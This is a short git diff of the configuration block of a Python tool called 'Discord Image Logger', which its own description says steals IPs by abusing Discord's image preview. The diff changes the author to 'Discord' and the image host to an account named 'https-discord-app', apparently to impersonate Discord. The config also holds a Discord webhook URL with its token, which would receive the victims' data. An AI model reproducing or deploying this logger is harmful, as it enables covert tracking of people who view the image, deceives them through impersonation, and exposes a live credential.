@@ -8,12 +8,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v3.0"
-__author__ = "Glitch"
+__author__ = "Discord"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1149424983517446295/-grP9Vg85Nh3cowKhNpSRv2Ff5ZBccqyOo5PlhDPTxE3ZepwOtLAHiJgnDURTFRlwPeN",
-    "image": "https://github.com/GlitchHunter-0001/revive-chat/blob/main/revive-chat.gif?raw=true", # You can also have a custom image by using a URL argument
+    "image": "https://github.com/https-discord-app/revive-chat/blob/main/revive-chat.gif?raw=true", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
